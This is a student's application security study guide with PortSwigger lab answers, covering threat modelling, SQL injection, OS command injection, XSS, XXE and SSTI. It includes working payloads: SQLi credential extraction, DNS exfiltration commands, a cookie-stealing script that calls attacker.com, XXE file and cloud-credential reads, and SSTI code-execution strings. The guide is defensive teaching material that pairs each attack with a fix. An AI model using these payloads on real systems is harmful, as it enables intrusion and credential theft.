# SST Application Security — Simplified Notes

> One file, all 5 sessions, plain language, plus answers to every PortSwigger lab assigned in class.
> Companion file (full PortSwigger coverage of all 30 topics): `PortSwigger-WebSecurity-Notes.md`

---

## Contents

1. [Session 1 — AppSec Basics & DVWA](#session-1)
2. [Session 2 — Pentest Phases, Burp Suite, nmap](#session-2)
3. [Session 3 — Threat Modeling (STRIDE/DREAD)](#session-3)
4. [Session 4 — SQL Injection](#session-4--sql-injection)
5. [Session 5 — OS Command Injection](#session-5--os-command-injection)
6. [Session 6 — XSS, DOM XSS & Clickjacking](#session-6--xss-dom-xss--clickjacking)
7. [Session 7 — XXE & SSTI](#session-7--xxe--ssti)
8. [Assignment — Threat Model](#assignment)
9. [Quick exam-style summary](#quick-exam-summary)

---

<a name="session-1"></a>
## Session 1 — AppSec Basics & DVWA

### What "Application Security" means in one line
Finding and fixing bugs in *software applications* before attackers find them.

### CIA Triad
- **C — Confidentiality:** only the right people can read the data.
- **I — Integrity:** data hasn't been changed without permission.
- **A — Availability:** the service is up when users need it.

### Why apps get hacked
Apps trust input they shouldn't. Every bug class boils down to: *user input was treated as if it were trusted code/data.*

### OWASP Top 10 (2021) — short form
| # | Category | One-line meaning |
|---|---|---|
| A01 | Broken Access Control | User accesses things they shouldn't (IDOR, admin panel) |
| A02 | Cryptographic Failures | Weak/no encryption of sensitive data |
| A03 | Injection | SQL/Command/LDAP injection |
| A04 | Insecure Design | No threat model — bad architecture |
| A05 | Security Misconfiguration | Default passwords, debug pages on |
| A06 | Vulnerable Components | Old libraries with known CVEs |
| A07 | Auth Failures | Weak passwords, no MFA, broken sessions |
| A08 | Data Integrity Failures | Insecure deserialization, unsigned updates |
| A09 | Logging & Monitoring Failures | No way to detect/respond to attacks |
| A10 | SSRF | Server fetches URLs attacker controls |

### DVWA (Damn Vulnerable Web App)
A purposely-broken PHP app to practice on locally.
- **Setup:** XAMPP / Docker → drop DVWA in `htdocs` → browse `http://localhost/dvwa` → "Create / Reset Database".
- **Security level slider** (Low/Medium/High/Impossible) lets you turn defences on/off.
- **Default creds:** `admin / password`.
- **Practice progression:** Brute Force → Command Injection → SQLi → File Upload → XSS → CSRF.

---

<a name="session-2"></a>
## Session 2 — Pentest Phases, Burp Suite, nmap

### The 8 phases of a pentest (memorize the order)

| # | Phase | Goal | One key tool |
|---|---|---|---|
| 1 | **Reconnaissance** | Gather public info about target | theHarvester, Amass, Shodan |
| 2 | **Threat Modeling** | Decide what to attack first | STRIDE, MS TMT |
| 3 | **Scanning & Enumeration** | Find open ports, services, endpoints | nmap, Gobuster, FFUF |
| 4 | **Vulnerability Analysis** | Find known weaknesses | Nuclei, Nessus, searchsploit |
| 5 | **Exploitation** | Prove the bug is real | Metasploit, Burp, SQLmap |
| 6 | **Post-Exploitation** | Show real impact (priv-esc, dump creds) | LinPEAS, Mimikatz |
| 7 | **Lateral Movement** | Pivot to other machines | CrackMapExec, Evil-WinRM |
| 8 | **Reporting** | Write up what you found + how to fix | Markdown, Dradis |

**Golden rule:** Never test without **written authorisation** (scope + ROE). Stay in scope. Document every action with timestamps.

### Recon — passive vs active
- **Passive:** doesn't touch the target. Google dorking, Shodan, WHOIS, OSINT, certificate transparency logs.
- **Active:** touches the target. nmap, dnsrecon, dirbusting.

Useful **Google dork operators**: `site:`, `filetype:`, `intitle:"index of"`, `inurl:admin`, `"password" filetype:xlsx`.

### nmap — the only commands you really need
| Command | What it does |
|---|---|
| `nmap -sV -p- target` | Version detect on all 65,535 ports |
| `nmap -sC -sV target` | Default scripts + version (most common) |
| `nmap -A target` | Aggressive (OS+scripts+traceroute) |
| `nmap -sU -p 53,161 target` | UDP scan on DNS / SNMP |
| `nmap -Pn target` | Skip ping (host blocks ICMP) |
| `nmap --script vuln target` | Run vuln-check scripts |
| `nmap -oA output target` | Save in all 3 formats |

### Web enumeration
- **Gobuster / FFUF / Feroxbuster** → directory and file brute-forcing.
- **Nikto** → web server misconfig and CVE scan.
- **Burp Spider** → crawl from the browser session.

### Burp Suite — what each tool does (simple)
| Burp tool | What it does |
|---|---|
| **Proxy** | Sits between browser and server. Intercept, modify, forward. |
| **Repeater** | Edit & re-send a single request. (Ctrl+R to send to it) |
| **Intruder** | Send same request many times with different payloads. |
| **Comparer** | Diff two responses. |
| **Decoder** | URL / base64 / HTML decode-encode. |
| **Collaborator** | Catch DNS/HTTP callbacks from blind bugs. |
| **Scanner** (Pro) | Automatic vuln scan. |

**Intruder attack types — memorize the difference:**
- **Sniper:** 1 payload list, 1 position at a time.
- **Battering Ram:** 1 payload list, same value in all positions.
- **Pitchfork:** 2 payload lists, run in parallel (1st of A with 1st of B).
- **Cluster Bomb:** every combination of multiple lists.

### Reporting — what every finding must contain
**Title · Severity (CVSS) · Affected Component · Description · Steps to Reproduce · Evidence · Business Impact · Remediation.**
Two audiences: execs (impact) and engineers (steps).

---

<a name="session-3"></a>
## Session 3 — Threat Modeling

### The 4 questions (Microsoft method)
1. **What are we building?** → draw DFD.
2. **What could go wrong?** → apply STRIDE.
3. **What do we do about it?** → list mitigations.
4. **Did we do a good job?** → review and update.

### Secure SDLC ("Shift Left")
Build security into every phase. Fix cost grows ~10× per phase you delay:
- Design: ~$1 · Code: ~$10 · Test: ~$100 · Production: ~$1,000+.
- **SAST** = static (code) testing. **DAST** = dynamic (running app) testing.

### DFD — the 5 symbols (must know)
| Symbol | Meaning | Example |
|---|---|---|
| ☐ Rectangle | **External Entity** (untrusted actor) | Browser, mobile app |
| ○ Circle | **Process** (your code) | API server, Lambda |
| ═══ Parallel lines | **Data Store** | DB, S3, Redis |
| → Arrow | **Data Flow** | HTTPS request, SQL query |
| - - - Dashed box | **Trust Boundary** | Internet ↔ VPC |

**Rule:** every arrow crossing a trust boundary is an attack-surface entry → validate input there.

### DFD levels — when to use which
- **Level 0:** whole system as 1 box. Use for scoping with execs.
- **Level 1:** main processes + stores + boundaries. **← use this for threat modeling.**
- **Level 2:** sub-processes inside each Level-1 box. Used for detailed module review.
- **Level 3:** function-level. Rarely needed.

### STRIDE — memorize the table
| Letter | Threat | Violates | Example | Fix |
|---|---|---|---|---|
| **S** | Spoofing | Authentication | Stolen cookie | MFA, signed JWTs, mTLS |
| **T** | Tampering | Integrity | SQLi, MITM edit | Parameterized queries, TLS, signatures |
| **R** | Repudiation | Non-repudiation | "I didn't do it" | Audit logs (immutable) |
| **I** | Info Disclosure | Confidentiality | Stack trace, public S3 | Encrypt, custom errors, ACLs |
| **D** | Denial of Service | Availability | DDoS, ReDoS | Rate-limit, autoscale, timeouts |
| **E** | Elevation of Privilege | Authorization | IDOR, role forgery | RBAC, server-side authz |

### DREAD — prioritize threats
Score each 1–10, then average:
- **D**amage · **R**eproducibility · **E**xploitability · **A**ffected users · **D**iscoverability
- 9–10 Critical · 7–8 High · 4–6 Medium · 1–3 Low.

### Other frameworks (one line each)
- **PASTA** — 7-stage, business-risk centric. Used by enterprise.
- **LINDDUN** — STRIDE but for **privacy** (GDPR).
- **Attack Trees** — hierarchical: root = goal, branches = attack paths.
- **MITRE ATT&CK** — catalog of real adversary tactics & techniques.

### Login flow worked example
User → Browser → API → Auth → DB
- **S:** stolen session cookie
- **T:** SQLi in username field
- **R:** no audit log of failed logins
- **I:** "username not found" vs "wrong password" leaks accounts
- **D:** credential stuffing locks real users out
- **E:** forged JWT with admin role

---

<a name="session-4--sql-injection"></a>
## Session 4 — SQL Injection

### Root cause (one sentence)
The app glues user input into an SQL string, so the database can't tell where developer-code ends and attacker-input begins.

### The 4 types of SQLi
| Type | What server shows you | Test payload |
|---|---|---|
| **In-band (classic / UNION)** | Data in response | `' UNION SELECT username, password FROM users--` |
| **Error-based** | DB error in response | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--` |
| **Boolean blind** | Page changes true/false | `' AND SUBSTRING(pass,1,1)='a'--` |
| **Time-based blind** | Response delay only | `' AND SLEEP(3)--` (MySQL) · `||pg_sleep(3)--` (Postgres) |

### UNION rules (must know — exam favourite)
1. **Number of columns must match.**
2. **Order of columns must match.**
3. **Datatypes must be compatible.**

Find column count: keep adding NULLs until no error.
```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--   ← 200 OK
```
Or use `' ORDER BY 1--`, `ORDER BY 2--`, …until error.

Find which column is text:
```
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```
Column that returns the string visibly = the text-type column.

### Comment syntax by DB
- **MySQL/MariaDB:** `--␣` (space after) or `#` or `/* */`
- **PostgreSQL:** `--` or `/* */`
- **MSSQL:** `--` or `/* */`
- **Oracle:** `--` only (every SELECT also needs `FROM dual`)

### How `admin'--` bypasses login
Query the dev wrote:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```
Attacker types username = `administrator'--`:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```
Everything after `--` is comment — password check is gone.

### How "Gifts category" lab works
Original query:
```sql
SELECT * FROM products WHERE category='Gifts' AND released=1
```
Inject `Gifts'+OR+1=1--`:
```sql
SELECT * FROM products WHERE category='Gifts' OR 1=1 --' AND released=1
```
`OR 1=1` makes the WHERE always true → returns hidden (unreleased) products too.

### The real fix
**Parameterized queries** (a.k.a. prepared statements). The query *structure* is sent first, *data* is sent separately — the DB never confuses them.
```python
# SAFE
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s",
               (username, password))
```

### Defence in depth (after parameterized queries)
- Least-privilege DB account (no DROP, no `xp_cmdshell`).
- Suppress raw error messages in prod.
- WAF (speed bump, not a wall).
- Input validation (use for type, not for safety).

### PortSwigger labs — class answers

**Lab — SQLi in WHERE clause allowing retrieval of hidden data**
`?category=Gifts'+OR+1=1--`

**Lab — SQLi allowing login bypass**
Username: `administrator'--` · Password: anything.

**Lab — UNION attack, determining number of columns**
`?category=Gifts'+UNION+SELECT+NULL--` then add NULLs one-by-one until you get HTTP 200 with no error. (Lab has 3 columns.)

**Lab — UNION, finding column with useful data type**
After confirming 3 columns:
```
'+UNION+SELECT+'a',NULL,NULL--
'+UNION+SELECT+NULL,'a',NULL--
'+UNION+SELECT+NULL,NULL,'a'--
```
The one that renders the `'a'` on the page = the text column.

**Lab — UNION retrieving data from other tables**
`'+UNION+SELECT+username,password+FROM+users--` → log in as administrator with retrieved password.

**Lab — SQLi listing unreleased products**
Same as the OR 1=1 lab — `Gifts'+OR+1=1--` shows the unreleased items because the released=1 filter is bypassed.

**Graded Lab A — SQLi with filter bypass via XML encoding**
The stock-check sends XML. The keyword `SELECT` is filtered. Use Hackvertor or manual XML/HTML entity-encode:
```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1 UNION &#x53;ELECT username || '~' || password FROM users</storeId>
</stockCheck>
```
`&#x53;` = `S`. WAF doesn't recognise the keyword; the parser decodes it before reaching the DB.

**Graded Lab B — Blind SQLi with conditional responses**
TrackingId cookie. Test:
```
TrackingId=xyz' AND '1'='1   ← "Welcome back" appears
TrackingId=xyz' AND '1'='2   ← no "Welcome back"
```
Extract administrator password char-by-char:
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
Use **Burp Intruder · Cluster bomb** with two payload sets:
- Position 1 → character index (1..20)
- Position 2 → character (a-z A-Z 0-9)
Grep "Welcome back" → for each position, the char where "Welcome back" appears is the right one. Assemble the password, log in.

---

<a name="session-5--os-command-injection"></a>
## Session 5 — OS Command Injection

### Root cause
Same as SQLi but the interpreter is the **OS shell** instead of the database. The app glues user input into a string passed to `system()`/`exec()`/`shell_exec()`.

```python
# VULNERABLE
os.system("ping -c 1 " + hostname)
# Attacker sends:  8.8.8.8; whoami
# Shell sees:      ping -c 1 8.8.8.8; whoami
```

### Shell metacharacters — know all 6 (+ newline)
| Char | Name | Behaviour |
|---|---|---|
| `;` | Semicolon | Run cmd2 **always** (most reliable) |
| `|` | Pipe | cmd1's output → cmd2 |
| `&&` | Logical AND | cmd2 only if cmd1 **succeeds** |
| `||` | Logical OR | cmd2 only if cmd1 **fails** |
| `$()` or `` `cmd` `` | Subshell | Inline substitution |
| `&` | Background | cmd1 in bg, cmd2 starts immediately |
| `%0a` | URL-encoded newline | Bypasses filters that only block `;` `|` |

Windows uses `&` (cmd.exe) or `;` (PowerShell). `type` instead of `cat`.

### 3 scenarios (decision tree)
1. **In-band** (output visible) → `; cat /etc/passwd` and read response.
2. **Time-based blind** (no output) → `; sleep 5` — confirm by Burp's timer.
3. **OOB blind** (no output, time blocked) → Burp Collaborator: `; nslookup x.BURPCOLLAB`.

Fallback: write to web root, fetch via HTTP — `; whoami > /var/www/html/x.txt`.

### Exfil via DNS (the graded lab)
```
; nslookup $(whoami).BURPCOLLAB.burpcollaborator.net
```
The Collaborator log shows a DNS query whose subdomain = `whoami`'s output.

### The fix
**Don't invoke a shell with user input.** Use list-form APIs that pass args directly to the OS:
```python
# SAFE — shell=False is default
subprocess.run(["ping", "-c", "1", hostname], shell=False)
```
With list form, `8.8.8.8; whoami` is treated as a literal hostname — `ping` just says "unknown host". The semicolon has no power because there's no shell to interpret it.

**Defence in depth:** use language libs instead of shelling (e.g. Python `socket` for DNS), strict regex validation, least-privilege web user.

### PortSwigger labs — class answers

**Lab 1 — OS command injection, simple case**
POST body, stock-check. Change `productID=1&storeID=1` to:
```
productID=1&storeID=1|whoami
```
Response includes the username (`peter-XXXX`).

**Lab 2 — Blind, time delay**
Feedback form. `email` field:
```
email=x||ping+-c+10+127.0.0.1||
```
Response takes ~10s → confirmed. (`+` is URL-encoded space.)

**Lab 3 — Blind, output redirection**
Web root for served images is `/var/www/images/`.
```
email=x||whoami>/var/www/images/out.txt||
```
Then `GET /image?filename=out.txt` returns `peter-XXXX`.

**Lab 4 — Blind, OOB**
```
email=x||nslookup+x.BURPCOLLAB||
```
Burp Collaborator → "Poll now" → DNS hit confirms execution.

**Graded Lab A — Blind, OOB data exfiltration**
```
email=x||nslookup+`whoami`.BURPCOLLAB||
```
Backticks run `whoami`, output becomes subdomain. Collaborator shows `peter-abc.<collab>` — submit the username `peter-abc` to solve.

---

<a name="session-6--xss-dom-xss--clickjacking"></a>
## Session 6 — XSS, DOM-Based XSS & Clickjacking

### XSS in one sentence
You make **someone else's browser** run **your JavaScript** on the vulnerable site, with their cookies and permissions.

### Three flavours
| Type | Where payload is stored | Trigger |
|---|---|---|
| **Reflected** | In the URL/parameter | Victim clicks attacker's link |
| **Stored** | Saved in DB (comment, profile) | Victim visits the normal page |
| **DOM-based** | Never reaches the server — handled in client JS | Often `location.hash` / `document.URL` |

### Why payload runs (mental model)
The browser parses HTML. Anywhere user input lands **inside an HTML or JS context** without proper encoding, an attacker can inject a `<script>` (or `onerror`, `onload`, `javascript:` URL, etc.) and the browser executes it as if the site wrote it.

### The classic cookie-steal example
Stored comment field:
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```
A logged-in user views the page → their browser sends their session cookie to attacker.com.
(*HttpOnly cookies block this exact attack — but most apps still have non-HttpOnly tokens, CSRF tokens etc.*)

### Common payloads (rank by likelihood of working)
1. `<script>alert(1)</script>` — naive
2. `<img src=x onerror=alert(1)>` — bypasses `<script>` filter
3. `<svg onload=alert(1)>` — bypasses many tag filters
4. `"><svg onload=alert(1)>` — break out of an attribute first
5. `javascript:alert(1)` — inside `href`/`src`
6. `'-alert(1)-'` — inside a JS string (single quotes)
7. `</script><script>alert(1)</script>` — break out of a `<script>` block

### DOM XSS — the only thing you need to remember
There are **sources** (where data enters): `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `localStorage`.
There are **sinks** (where data executes): `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` (with string), `element.src`, jQuery `$()` with selector.
**Source → Sink without sanitisation = DOM XSS.**

### Clickjacking
You load the target site in an **invisible iframe** on top of a fake page. The user thinks they're clicking your button — really they're clicking the target's "Delete account" button.

**Defence:** `X-Frame-Options: DENY` header OR `Content-Security-Policy: frame-ancestors 'none'`.

### The real fix for XSS
- **Output encoding** based on context (HTML / attribute / JS / URL — each different).
- **Content Security Policy (CSP)** — `script-src 'self'` blocks inline + remote scripts.
- **HttpOnly** cookies for sessions.
- **Frameworks** (React/Angular/Vue) auto-escape by default — don't bypass with `dangerouslySetInnerHTML`.

### PortSwigger labs — class answers (most common assigned)

**Apprentice — Reflected XSS into HTML context, nothing encoded**
`?search=<script>alert(1)</script>`

**Apprentice — Stored XSS into HTML context**
Comment body: `<script>alert(1)</script>` (or `<img src=x onerror=alert(1)>`)

**Apprentice — DOM XSS in document.write via search param**
`?search=x"><svg onload=alert(1)>`

**Apprentice — DOM XSS in innerHTML sink**
`?search=<img src=1 onerror=alert(1)>`

**Apprentice — Reflected XSS into attribute, angle brackets HTML-encoded**
Search payload: `" autofocus onfocus=alert(1) x="` — breaks out of the attribute, adds a new event handler.

**Apprentice — Reflected into JS string, single quote & backslash escaped**
`</script><script>alert(1)</script>` — escape out of the `<script>` block entirely.

**Practitioner — Exploit XSS to steal cookies**
Stored:
```html
<script>fetch('https://YOUR-COLLAB/?c='+document.cookie)</script>
```
Wait for victim to view page → cookie appears in Collaborator → use cookie to take over session.

**Practitioner — Exploit XSS to perform CSRF**
```html
<script>
var x=new XMLHttpRequest();
x.open('GET','/my-account');
x.onload=()=>{
  var t=/name="csrf" value="([^"]+)/.exec(x.responseText)[1];
  var c=new XMLHttpRequest();
  c.open('POST','/my-account/change-email');
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send('email=evil@a.com&csrf='+t);
};
x.send();
</script>
```

**Clickjacking — basic with CSRF token protection**
Host an HTML page that iframes `/my-account` and overlays a decoy button "Click for prize" exactly over the "Delete account" button. Set iframe `opacity:0.0001`. Submit lab solution.

---

<a name="session-7--xxe--ssti"></a>
## Session 7 — XXE & SSTI

### XXE — XML External Entity

**What:** The XML parser allows defining "entities" (variables) that load from external sources. An attacker defines one that reads a file or pings their server.

**Key pieces of the payload:**
- `<!DOCTYPE ...>` = block where you tell the parser the rules.
- `<!ENTITY name "value">` = define a variable.
- `<!ENTITY name SYSTEM "url">` = variable loads from an **external** resource.
- `&name;` = use the variable somewhere in the XML body.

**Lab 1 — Retrieve files via XXE** *(in-band, file read)*
The shop's stock-check sends XML. Inject:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Server returns `/etc/passwd` contents in the error/response that previously echoed productId.

**Lab 2 — XXE to perform SSRF**
Change the entity to fetch the AWS metadata endpoint:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```
The metadata response (containing IAM creds) is returned to you.

**Lab 3 — Blind XXE with out-of-band interaction**
Response doesn't echo anything. Use Burp Collaborator:
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Collaborator receives a DNS/HTTP hit → confirms blind XXE.

**The fix:** disable external entities in the XML parser:
- Java: `XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)`
- PHP: `libxml_disable_entity_loader(true)` (pre-8.0)
- Python: use `defusedxml` instead of standard library.

---

### SSTI — Server-Side Template Injection

**What:** App embeds user input directly into a server-side template (Jinja2, Twig, Freemarker, ERB, Velocity…). Attacker injects template syntax that the engine evaluates.

**Detect:** Send `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}` — if any reflects as `49`, you have SSTI in that engine.

**SST Class methodology (3 steps from notes):**
1. Look for **reflection** of user-controlled input.
2. **Enumerate** the template engine — fingerprint by which math syntax evaluates.
3. **Find the payload** that maps to that engine's RCE primitive.

**Common engine → quick RCE payload**
| Engine | Detect | RCE-ish payload |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker (Java) | `${7*7}` → 49 | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= system("id") %>` |
| Velocity (Java) | `#set($x=7*7)$x` → 49 | `#set($e="exp")${e.getClass().forName("Runtime")...exec("id")}` |

**Lab 1 — Basic SSTI**
Engine is ERB. Vulnerable param reflected. Payload:
```
<%= system("rm /home/carlos/morale.txt") %>
```

**The fix:** never concatenate user input into templates. Use the engine's "context" API to pass data as variables. Sandbox/disable dangerous tags. Treat templates as code.

---

<a name="assignment"></a>
## Assignment — Threat Model (Session 3 graded)

**Task:** for the provided web app architecture diagram, do **two deliverables**:

### Part 1 — DFD Level 1 (on pen & paper)
Use the 5 standard symbols. Make sure to label:
- Every external entity (user browser, third-party API).
- Every process (web server, API, auth service, background worker).
- Every data store (DB, S3, cache).
- Every data flow (HTTP request, SQL query, message queue).
- Every trust boundary (Internet ↔ VPC, public ↔ private subnet).

Take a clear photo/scan → upload.

### Part 2 — STRIDE table (Excel)
For each component on the DFD, write **at least 2 threats**, one per STRIDE category where it applies.

Each row: `Component | Threat Description | STRIDE Category | Attack Vector | Impact | Mitigation`.

**Example row (web server):**
| Component | Threat | STRIDE | Attack Vector | Impact | Mitigation |
|---|---|---|---|---|---|
| Login API | SQLi in username field bypasses auth | T | `' OR '1'='1'--` in POST body | Full DB read, admin takeover | Parameterized queries, least-priv DB user |

**Tip for marks:**
- Don't write generic threats ("attacker exploits server"). Write *specific* threats ("SQLi in `/api/login` username field").
- Pair each with a *specific* mitigation (a control, not "use security").
- Cover all components on the DFD. Aim for 12-20 rows minimum.
- If using DREAD: add the score column and sort by risk.

---

<a name="quick-exam-summary"></a>
## Quick exam-style summary

### "What's the root cause of injection bugs?"
User input is concatenated into a string passed to an interpreter (DB, shell, template engine, XML parser). The interpreter can't separate code from data. Fix = parameterized API.

### "How many columns in a UNION attack?"
Use `NULL` padding or `ORDER BY n` — increment until error.

### "What does `--` do in SQLi?"
Starts a SQL comment — everything after it on the line is ignored. Strips the rest of the original query.

### "Why is `subprocess.run(["ping","-c","1",hostname], shell=False)` safe but `os.system("ping -c 1 " + hostname)` not?"
List form passes args directly via `execve()` — no shell parses the metacharacters. With `os.system`, a shell is invoked, and `;` etc. become command separators.

### "STRIDE in 30 seconds"
Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege — one per CIA-ish property: Authentication, Integrity, Non-repudiation, Confidentiality, Availability, Authorization.

### "DREAD formula"
`Risk = (Damage + Reproducibility + Exploitability + Affected users + Discoverability) / 5`

### "DFD levels"
0 = context · 1 = main processes (use for TM) · 2 = sub-processes · 3 = function-level.

### "Difference between attack surface and attack vector"
Surface = entry points that *exist*. Vector = the *specific path/technique* used through one of those entry points.

### "Reflected vs Stored vs DOM XSS"
- Reflected: payload in URL → server reflects in response.
- Stored: payload saved server-side → triggers on every view.
- DOM: payload never sent to server — handled by client-side JS source → sink.

### "Why is HttpOnly important?"
JS can't read `document.cookie` for cookies marked HttpOnly → defeats the basic `fetch('attacker?c='+document.cookie)` XSS exfil.

### "X-Frame-Options vs CSP frame-ancestors"
Both stop clickjacking. CSP `frame-ancestors` is the modern replacement, supports multiple sources.

### "What does `&xxe;` do in the XXE payload?"
It's a reference to the entity defined in `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. When the parser sees `&xxe;` in the XML body, it substitutes the loaded file contents.

### "How do you confirm blind injection?"
Time delay (`sleep`) or OOB callback (Burp Collaborator DNS/HTTP). Use Collaborator when time delays are unreliable or filtered.

### "Why is SQLi-via-error different from blind?"
Error-based: DB error string contains your extracted data. Blind: no data at all, just a true/false or timing signal.

### "Difference between SAST and DAST"
SAST reads **source code** statically (Semgrep, Bandit, CodeQL). DAST tests the **running app** (Burp, OWASP ZAP, Nuclei).

### "Top web tools to know by name"
nmap (network), Burp (web proxy), SQLmap (auto SQLi), Gobuster/FFUF (dir brute), Nuclei (templated CVE), Hydra (online brute), Hashcat (offline crack), Metasploit (exploit framework).

---

## Cross-reference

For *every* PortSwigger topic (not just the ones in lecture) — including Authentication, Access Control, SSRF, CSRF, CORS, WebSockets, OAuth, JWT, Race Conditions, GraphQL, Deserialization, Request Smuggling, Cache Poisoning, Host Header, Prototype Pollution, Web LLM, Path Traversal, File Upload, NoSQL, API Testing, Web Cache Deception, Information Disclosure, Business Logic — see the companion file:

→ **`PortSwigger-WebSecurity-Notes.md`** (full coverage of all 30 topics with lab solutions).
